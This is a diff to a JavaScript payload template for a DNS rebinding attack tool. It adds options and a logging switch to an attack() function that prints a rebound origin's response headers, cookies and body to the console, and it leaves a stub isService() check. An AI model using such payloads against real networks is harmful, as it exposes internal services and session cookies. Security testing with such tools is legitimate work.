@@ -7,21 +7,26 @@ Copy the content of this file to a new .js file and add its name to the
 const SimpleFetchGet = () => {
 
     // Invoked after DNS rebinding has been performed
-    function attack(headers, cookie, body) {
-        if (headers !== null) {
-            console.log(`Origin: ${window.location} headers: ${httpHeaderstoText(headers)}`);
-        };
-        if (cookie !== null) {
-            console.log(`Origin: ${window.location} headers: ${cookie}`);
-        };
-        if (body !== null) {
-            console.log(`Origin: ${window.location} body:\n${body}`);
-        };
+    function attack(headers, cookie, body, wsProxyPort, options) {
+        options = options || { headers: {}, config: {} };
+        const config = options.config || {};
+
+        if (config.logResponse !== false) { // default is true
+            if (headers !== null) {
+                console.log(`Origin: ${window.location} headers: ${httpHeaderstoText(headers)}`);
+            };
+            if (cookie !== null) {
+                console.log(`Origin: ${window.location} headers: ${cookie}`);
+            };
+            if (body !== null) {
+                console.log(`Origin: ${window.location} body:\n${body}`);
+            };
+        }
     }
 
     // Invoked to determine whether the rebinded service
     // is the one targeted by this payload. Must return true or false.
-    async function isService(headers, cookie, body) {
+    async function isService(headers, cookie, body, options) {
         return false;
     }
 
